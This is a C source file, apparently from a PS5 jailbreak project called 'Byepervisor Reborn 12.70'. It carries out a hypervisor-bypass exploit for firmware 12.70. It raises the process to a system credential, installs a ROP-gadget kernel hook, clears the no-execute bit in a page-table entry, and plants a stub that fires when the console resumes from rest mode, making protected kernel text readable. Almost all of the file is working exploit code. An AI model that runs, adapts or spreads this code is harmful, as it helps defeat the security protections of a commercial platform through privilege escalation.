#include <fcntl.h>
#include <inttypes.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include <ps5/kernel.h>
#include <ps5/klog.h>

#include "kdlsym.h"
#include "khook_1270_alias.h"
#include "khook.h"
#include "paging.h"
#include "util.h"
#include "textmap_1270.h"
#include "break_hv_payload/vmcb_strike_1270.h"

#define FW_1270             0x12700000U
#define SYSTEM_AUTHID       0x4800000000000007ULL
#define HOOK_CORE           0
#define HOOK_IST            6
#define CAVE_STATE_OFF      0x600ULL
#define PCPU_ARRAY_OFFSET   0x2e9cf00ULL
#define PCPU_STRIDE         0x980ULL
#define SECOND_MARKER       0x1270DBDB5EEDBEEFULL
#define BIG_SAVE_BYTES      0x600U
#define MAX_AWAKE_POLLS     600U
#define MAX_RESUME_POLLS    15U
#define CARRIER_PA          0x3ffff000ULL
#define AP_SURVEY_ENTERED   0x1270A9E17E5E2001ULL
#define AP_MARKER           0x1270A9E17E5E2002ULL
#define AP_SURVEY_REJECTED  0x1270A9E17E5E2003ULL
#define AP_STRIKE_FAILED    0x1270A9E17E5E2004ULL
#define PARAM_QWORDS        3U
#define STUB_BYTES          224U
#define STUB_QWORDS         28U
#define PROBE_STEM          "byepervisor-1270"
#define NX_BIT              (1ULL << 63)
#define RAM_LIMIT           0x400000000ULL

static uint8_t saved_head[KH_SCRATCH_MIN];
static uint8_t saved_big[BIG_SAVE_BYTES];
static char output_path[128];
static int usb_log_enabled;
static uint8_t ap_stub[STUB_QWORDS * 8];
static uint64_t carrier_pml4e_addr, carrier_pml4e_original;
static int carrier_map_changed;
static int probe_cleanup_seen, probe_cleanup_status;

static int append_store(kh_chain_t *chain, uint64_t dst, uint64_t value)
{
  return kh_chain_g(chain, KERNEL_GADGET_POP_RCX) == 0 &&
         kh_chain_q(chain, dst) == 0 &&
         kh_chain_g(chain, KERNEL_GADGET_POP_RAX) == 0 &&
         kh_chain_q(chain, value) == 0 &&
         kh_chain_g(chain, KERNEL_GADGET_ST_RCX_RAX) == 0 ? 0 : -1;
}

static int build_stub(uint64_t oracle, uint64_t vector)
{
  if (vmcb_strike_1270_len != STUB_BYTES)
    return -1;
  memset(ap_stub, 0, sizeof(ap_stub));
  memcpy(ap_stub, vmcb_strike_1270, STUB_BYTES);
  return 0;
}

static int restore_carrier_map(void)
{
  if (!carrier_map_changed)
    return 0;
  uint64_t current = 0, readback = 0;
  if (kread(carrier_pml4e_addr, &current, 8) != 0 ||
      ((current ^ carrier_pml4e_original) &
       ~(NX_BIT | (1ULL << 5) | (1ULL << 6))))
    return -1;
  uint64_t restored = current | NX_BIT;
  if (kwrite(carrier_pml4e_addr, &restored, 8) != 0 ||
      kread(carrier_pml4e_addr, &readback, 8) != 0 ||
      readback != restored)
    return -2;
  carrier_map_changed = 0;
  return 0;
}

static int read_qword(uint64_t addr, uint64_t *value)
{
  *value = 0;
  return kread(addr, value, sizeof(*value));
}

static void save_line(const char *line, int create)
{
  if (!create && !usb_log_enabled)
    return;
  int flags = O_WRONLY | (create ? O_CREAT | O_EXCL : O_APPEND);
  int fd = open(output_path, flags, 0600);
  if (fd < 0)
    goto disabled;
  size_t length = strlen(line);
  ssize_t written = write(fd, line, length);
  int synced = written == (ssize_t)length ? fsync(fd) : -1;
  int closed = close(fd);
  if (written != (ssize_t)length || synced != 0 || closed != 0)
    goto disabled;
  usb_log_enabled = 1;
  return;

disabled:
  usb_log_enabled = 0;
  klog("RSH1270,1,usb-log-unavailable,path=%s\n", output_path);
}

static int cleanup(khook_t *hook, int armed, uint64_t cave,
                   uint64_t authid, int restore_cave)
{
  int disarm = 0, gate = 0, head = 0, big = 0, marker = 0;
  if (armed) {
    intptr_t thread = kernel_get_proc_thread(getpid(), -1);
    uint64_t row_thread = 0;
    uint64_t row = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                   PCPU_ARRAY_OFFSET + HOOK_CORE * PCPU_STRIDE;
    if (pin_to_core(HOOK_CORE) != 0 || !thread ||
        read_qword(row, &row_thread) != 0 || row_thread != (uint64_t)thread)
      disarm = -1;
    else
      disarm = kh_disarm(hook);
  }
  if (hook->installed && disarm == 0)
    gate = kh_restore(hook);
  if (restore_cave && disarm == 0 && gate == 0) {
    head = kwrite(cave, saved_head, sizeof(saved_head));
    big = kwrite(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big));
    marker = kwrite(cave + KH_OFF_USER, saved_head + KH_OFF_USER, 8);
  }
  int carrier_map = restore_carrier_map();
  int auth = kernel_set_ucred_authid(getpid(), authid);
  klog("AFP1270,1,cleanup,disarm=%d,gate=%d,head=%d,big=%d,marker=%d,carrier_map=%d,auth=%d\n",
       disarm, gate, head, big, marker, carrier_map, auth);
  int result = disarm == 0 && gate == 0 && head == 0 && big == 0 &&
         marker == 0 && carrier_map == 0 && auth == 0
         ? 0 : -1;
  probe_cleanup_seen = 1;
  probe_cleanup_status = result;
  return result;
}

static int probe_main(void)
{
  uint32_t fw = kernel_get_fw_version();
  if ((fw & 0xffff0000U) != FW_1270) {
    klog("RSH1270,1,stop,stage=firmware,fw=0x%08x\n", fw);
    return 2;
  }

  uint64_t cave = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t target = kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL);
  uint64_t stock_vector = kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR);
  uint64_t pmap = kdlsym(KERNEL_SYM_PMAP_STORE);
  uint64_t cr3 = 0, state = 0, marker_before = 0, ap_before = 0;
  uint64_t survey_before = 0;
  uint64_t strike_packed_before = 0;
  if (target < ktext(0) || target >= ktext(KH_KIMG_MAX) ||
      stock_vector < ktext(0) || stock_vector >= ktext(KH_KIMG_MAX) ||
      read_qword(pmap + 0x28, &cr3) != 0 || cr3 == 0 || (cr3 & 0xfff) ||
      read_qword(cave + CAVE_STATE_OFF, &state) != 0 || state != 0 ||
      read_qword(cave + KH_OFF_USER, &marker_before) != 0 ||
      marker_before != 0 ||
      read_qword(cave + KH_OFF_USER + 8, &ap_before) != 0 ||
      ap_before != 0
      || read_qword(cave + KH_OFF_USER + 16, &survey_before) != 0 ||
      survey_before != 0
      || read_qword(cave + KH_OFF_USER + 24, &strike_packed_before) != 0 ||
      strike_packed_before != 0
      ) {
    klog("RSH1270,1,stop,stage=preflight,target=0x%016" PRIx64
         ",vector=0x%016" PRIx64 ",cr3=0x%016" PRIx64
         ",state=0x%016" PRIx64 ",marker=0x%016" PRIx64 "\n",
         target, stock_vector, cr3, state, marker_before);
    return 3;
  }

  uint64_t carrier_va = kdldmap(CARRIER_PA);
  uint64_t pml4e = 0, pdpte = 0, pde = 0;
  carrier_pml4e_addr = find_pml4e(pmap, carrier_va, &pml4e);
  if (carrier_pml4e_addr == UINT64_MAX ||
      !PDE_FIELD(pml4e, PRESENT) ||
      PDE_ADDR(pml4e) >= RAM_LIMIT || !(pml4e & NX_BIT)) {
    klog("AFP1270,1,stop,stage=pml4,pml4e=0x%016" PRIx64 "\n", pml4e);
    return 3;
  }
  uint64_t pdpte_addr = find_pdpe(pmap, carrier_va, &pdpte);
  if (pdpte_addr == UINT64_MAX ||
      !PDE_FIELD(pdpte, PRESENT) || PDE_FIELD(pdpte, PS) ||
      PDE_ADDR(pdpte) >= RAM_LIMIT || (pdpte & NX_BIT)) {
    klog("AFP1270,1,stop,stage=pdpt,pdpte=0x%016" PRIx64 "\n", pdpte);
    return 3;
  }
  uint64_t pde_addr = find_pde(pmap, carrier_va, &pde);
  if (pde_addr == UINT64_MAX ||
      !PDE_FIELD(pde, PRESENT) || !PDE_FIELD(pde, PS) ||
      (pde & NX_BIT) ||
      (PDE_ADDR(pde) & ~0x1fffffULL) !=
          (CARRIER_PA & ~0x1fffffULL)) {
    klog("AFP1270,1,stop,stage=carrier-topology,pml4e=0x%016" PRIx64
         ",pdpte=0x%016" PRIx64 ",pde=0x%016" PRIx64 "\n",
         pml4e, pdpte, pde);
    return 3;
  }
  carrier_pml4e_original = pml4e;
  if (build_stub(cave + KH_OFF_USER + 8, stock_vector) != 0) {
    klog("AFP1270,1,stop,stage=stub-build\n");
    return 3;
  }
  uint8_t carrier_before[sizeof(ap_stub)] = {0};
  if (kread(carrier_va, carrier_before, sizeof(carrier_before)) != 0) {
    klog("AFP1270,1,stop,stage=carrier-read\n");
    return 3;
  }

  uint64_t authid = kernel_get_ucred_authid(getpid());
  if (kernel_set_ucred_authid(getpid(), SYSTEM_AUTHID) != 0 ||
      pin_to_core(HOOK_CORE) != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("RSH1270,1,stop,stage=authid-or-affinity\n");
    return 4;
  }

  intptr_t thread = kernel_get_proc_thread(getpid(), -1);
  uint64_t row_thread = 0;
  uint64_t row = (uint64_t)KERNEL_ADDRESS_DATA_BASE +
                 PCPU_ARRAY_OFFSET + HOOK_CORE * PCPU_STRIDE;
  if (!thread || read_qword(row, &row_thread) != 0 ||
      row_thread != (uint64_t)thread ||
      kread(cave, saved_head, sizeof(saved_head)) != 0 ||
      kread(cave + KH_OFF_BIG_CHAIN, saved_big, sizeof(saved_big)) != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("RSH1270,1,stop,stage=thread-or-backup,thread=0x%016" PRIx64
         ",row_thread=0x%016" PRIx64 "\n",
         (uint64_t)thread, row_thread);
    return 5;
  }

  uint8_t handler_buf[(STUB_QWORDS + PARAM_QWORDS) * 5 * 8] = {0};
  kh_chain_t store_chain;
  kh_chain_init(&store_chain, handler_buf, sizeof(handler_buf));
  for (unsigned i = 0; i < STUB_QWORDS; ++i) {
    uint64_t qword = 0;
    memcpy(&qword, ap_stub + i * 8, 8);
    if (append_store(&store_chain, carrier_va + i * 8, qword) != 0) {
      kernel_set_ucred_authid(getpid(), authid);
      return 5;
    }
  }
  uint64_t params[PARAM_QWORDS] = {
    stock_vector, kdldmap(0), cave + KH_OFF_USER + 8
  };
  for (unsigned i = 0; i < PARAM_QWORDS; ++i) {
    if (append_store(&store_chain, carrier_va + 0xf00 + i * 8,
                     params[i]) != 0) {
      kernel_set_ucred_authid(getpid(), authid);
      return 5;
    }
  }

  // The one-shot marker precedes this chain in the 0x600-byte data cave.
  if (sizeof(uint64_t) * 5 + store_chain.len + 0x100 >
      BIG_SAVE_BYTES) {
    kernel_set_ucred_authid(getpid(), authid);
    klog("AFP1270,1,stop,stage=chain-capacity,bytes=%zu,capacity=%u\n",
         sizeof(uint64_t) * 5 + store_chain.len + 0x100,
         BIG_SAVE_BYTES);
    return 5;
  }

  char line[384];
  uint64_t carrier_first8 = 0;
  memcpy(&carrier_first8, carrier_before, 8);
  snprintf(line, sizeof(line),
           "prepared,pid=%d,target=0x%016" PRIx64
           ",stock_vector=0x%016" PRIx64 ",cr3=0x%016" PRIx64
           ",carrier=0x%016" PRIx64 ",first8=0x%016" PRIx64
           ",stub_bytes=%u,stores=%u,chain_bytes=%zu\n",
           (int)getpid(), target, stock_vector, cr3, carrier_va,
           carrier_first8,
           STUB_BYTES, STUB_QWORDS, store_chain.len);
  save_line(line, 0);

  khook_t hook;
  int result = kh_init(&hook, kread, kwrite, ktext(0), cave, HOOK_IST);
  if (result != 0) {
    kernel_set_ucred_authid(getpid(), authid);
    return 8;
  }
  hook.tss_stride = KH_TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  kh_set_hook_target(&hook, target);
  hook.oneshot = 1;
  kh_set_resume_rsi(&hook, carrier_va);
  kh_set_resume_rdx(&hook, cr3);

  klog("RSH1270,1,start,target=0x%016" PRIx64
       ",vector=0x%016" PRIx64 ",cr3=0x%016" PRIx64 "\n",
       target, stock_vector, cr3);
  save_line("hook,before-install\n", 0);
  result = kh_install(&hook, &store_chain);
  if (result != 0) {
    klog("RSH1270,1,stop,stage=install,result=%d\n", result);
    save_line("hook,install-failed\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 10;
  }
  save_line("hook,after-install\n", 0);

  uint64_t chain_prefix[5] = {0};
  int chain_ok = kread(cave + KH_OFF_BIG_CHAIN, chain_prefix,
                       sizeof(chain_prefix)) == 0 &&
                 chain_prefix[0] == kgadget(KERNEL_GADGET_POP_RCX) &&
                 chain_prefix[1] == cave + KH_OFF_USER &&
                 chain_prefix[2] == kgadget(KERNEL_GADGET_POP_RAX) &&
                 chain_prefix[3] == SECOND_MARKER &&
                 chain_prefix[4] == kgadget(KERNEL_GADGET_ST_RCX_RAX);
  if (!chain_ok) {
    save_line("hook,marker-chain-mismatch\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }
  uint8_t installed_handler[sizeof(handler_buf)] = {0};
  if (kread(cave + KH_OFF_BIG_CHAIN + sizeof(chain_prefix),
            installed_handler, store_chain.len) != 0 ||
      memcmp(installed_handler, handler_buf, store_chain.len) != 0) {
    save_line("hook,store-chain-mismatch\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }

  uint64_t exec_pml4e = carrier_pml4e_original & ~NX_BIT;
  uint64_t map_readback = 0;
  if (kwrite(carrier_pml4e_addr, &exec_pml4e, 8) != 0 ||
      kread(carrier_pml4e_addr, &map_readback, 8) != 0 ||
      map_readback != exec_pml4e) {
    carrier_map_changed = 1;
    save_line("stop,stage=carrier-map-write\n", 0);
    cleanup(&hook, 0, cave, authid, 1);
    return 12;
  }
  carrier_map_changed = 1;
  save_line("carrier,guest-nx-cleared,stage=resume-only\n", 0);

  save_line("hook,before-trigger\n", 0);
  result = kh_trigger(&hook);
  if (result != 0) {
    save_line("hook,trigger-failed\n", 0);
    cleanup(&hook, 1, cave, authid, 1);
    return 14;
  }
  save_line("hook,after-trigger\n", 0);

  uint64_t marker = 0, ap_marker = 0;
  if (read_qword(cave + KH_OFF_USER, &marker) != 0 || marker != 0 ||
      read_qword(cave + KH_OFF_USER + 8, &ap_marker) != 0 ||
      ap_marker != 0) {
    save_line("hook,unexpected-early-marker\n", 0);
    cleanup(&hook, 1, cave, authid, 1);
    return 16;
  }

  save_line("ready,enter-rest-mode\n", 0);
  klog("RSH1270,1,ready,usb_log=%d,path=%s\n",
       usb_log_enabled, output_path);
  notifyf("12.70 %s AP probe ready\nEnter rest mode, then resume", PROBE_STEM);

  struct timespec previous = {0};
  clock_gettime(CLOCK_REALTIME, &previous);
  unsigned resumed_polls = 0;
  int saw_resume_gap = 0;
  for (unsigned awake = 0; awake < MAX_AWAKE_POLLS; ++awake) {
    sleep(1);
    struct timespec now = {0};
    if (clock_gettime(CLOCK_REALTIME, &now) == 0) {
      int64_t gap = (int64_t)now.tv_sec - (int64_t)previous.tv_sec;
      if (gap >= 10 && !saw_resume_gap) {
        saw_resume_gap = 1;
        klog("RSH1270,1,resume-gap,seconds=%ld\n", (long)gap);
      }
      previous = now;
    }
    if (read_qword(cave + KH_OFF_USER, &marker) != 0 ||
        read_qword(cave + KH_OFF_USER + 8, &ap_marker) != 0) {
      save_line("stop,marker-read-failed\n", 0);
      cleanup(&hook, 1, cave, authid, 1);
      return 18;
    }
    if (marker == SECOND_MARKER &&
        (ap_marker == AP_MARKER
         || ap_marker == AP_SURVEY_REJECTED
         || ap_marker == AP_STRIKE_FAILED
         ))
      break;
    if ((marker != 0 && marker != SECOND_MARKER) ||
        (ap_marker != 0 && ap_marker != AP_MARKER
         && ap_marker != AP_SURVEY_ENTERED &&
         ap_marker != AP_SURVEY_REJECTED
         && ap_marker != AP_STRIKE_FAILED
         )) {
      save_line("stop,unexpected-marker\n", 0);
      cleanup(&hook, 1, cave, authid, 1);
      return 19;
    }
    if (marker == SECOND_MARKER && ++resumed_polls >= MAX_RESUME_POLLS)
      break;
  }

  int fired = marker == SECOND_MARKER;
  int ap_entered = ap_marker == AP_MARKER
                   || ap_marker == AP_SURVEY_ENTERED ||
                   ap_marker == AP_SURVEY_REJECTED
                   || ap_marker == AP_STRIKE_FAILED
                   ;
  uint64_t survey_count = 0;
  int survey_read = read_qword(cave + KH_OFF_USER + 16, &survey_count);
  uint64_t strike_packed = 0;
  int strike_packed_read = read_qword(cave + KH_OFF_USER + 24,
                                     &strike_packed);
  int cleanup_result = cleanup(&hook, !fired, cave, authid, 1);
  snprintf(line, sizeof(line),
           "result,bp=0x%016" PRIx64 ",ap=0x%016" PRIx64
           ",survey_count=%" PRIu64 ",survey_read=%d"
           ",reject_packed=0x%016" PRIx64
           ",reject_ctrl_low=0x%03" PRIx64
           ",reject_root_page=0x%016" PRIx64 ",reject_read=%d"
           ",bp_fired=%d,ap_entered=%d,resume_gap=%d,cleanup=%d\n",
           marker, ap_marker,
           survey_count, survey_read,
           strike_packed, (uint64_t)(strike_packed & 0xfffULL),
           (uint64_t)(strike_packed & ~0xfffULL), strike_packed_read,
           fired, ap_entered, saw_resume_gap,
           cleanup_result);
  save_line(line, 0);
  klog("AFP1270,1,%s", line);
  // CLOCK_REALTIME may not expose the S3 pause to this polling thread.
  // The marker and cleanup are the probe's success criteria.
  return fired && ap_entered && cleanup_result == 0
         && ap_marker == AP_MARKER && survey_read == 0 &&
         survey_count == 16
         && strike_packed_read == 0 && strike_packed == 0
         ? 0 : 20;
}

static int textmap_progress(const char *stage, unsigned count)
{
  char line[96];
  snprintf(line, sizeof(line), "textmap,%s,count=%u\n", stage, count);
  save_line(line, 0);
  return 0;
}

int byepervisor_1270_run(void)
{
  uint32_t fw = kernel_get_fw_version();
  int soc = sceKernelGetMainSocId();
  if ((fw & 0xffff0000U) != FW_1270 || soc != 0x840f60)
    return 2;

  struct timespec stamp = {0};
  clock_gettime(CLOCK_REALTIME, &stamp);
  snprintf(output_path, sizeof(output_path),
           "/mnt/usb0/PS5-12.70-%s-%d-%ld-%ld.txt",
           PROBE_STEM, (int)getpid(), (long)stamp.tv_sec, (long)stamp.tv_nsec);
  save_line("start,mode=unified,fw=12.70,soc=launch\n", 1);

  textmap_1270_status_t map = {0};
  int prepared = textmap_1270_prepare(&map, textmap_progress);
  if (prepared != 0) {
    char line[96];
    snprintf(line, sizeof(line), "stop,stage=textmap,result=%d\n", prepared);
    save_line(line, 0);
    if (prepared == -11)
      notifyf("12.70 text-map rollback failed; reboot required");
    return 5;
  }

  int probe = probe_main();
  if (probe != 0) {
    int restore = probe_cleanup_seen && probe_cleanup_status != 0 ?
                  -3 : textmap_1270_restore();
    char line[128];
    snprintf(line, sizeof(line),
             "stop,stage=ap-strike,result=%d,cleanup_seen=%d,"
             "cleanup=%d,textmap_restore=%d\n",
             probe, probe_cleanup_seen, probe_cleanup_status, restore);
    save_line(line, 0);
    if (restore != 0)
      notifyf("12.70 strike cleanup uncertain; reboot required");
    return 6;
  }

  int verified = textmap_1270_verify();
  uint64_t first = 0;
  int text_read = verified == (int)map.entries ?
                  kernel_copyout((intptr_t)KERNEL_ADDRESS_TEXT_BASE,
                                 &first, sizeof(first)) : -1;
  char line[160];
  snprintf(line, sizeof(line),
           "end,vmcbs=16,text_entries=%u,text_verified=%d,"
           "text_read=%d,first8=0x%016" PRIx64 "\n",
           map.entries, verified, text_read, first);
  save_line(line, 0);
  if (verified != (int)map.entries || text_read != 0 ||
      first != UINT64_C(0x0000000058c55be8)) {
    notifyf("12.70 text verification failed; reboot required");
    return 7;
  }
  notifyf("Byepervisor Reborn 12.70\n"
          "Kernel text readable: %02x %02x %02x %02x %02x %02x %02x %02x",
          ((uint8_t *)&first)[0], ((uint8_t *)&first)[1],
          ((uint8_t *)&first)[2], ((uint8_t *)&first)[3],
          ((uint8_t *)&first)[4], ((uint8_t *)&first)[5],
          ((uint8_t *)&first)[6], ((uint8_t *)&first)[7]);
  return 0;
}
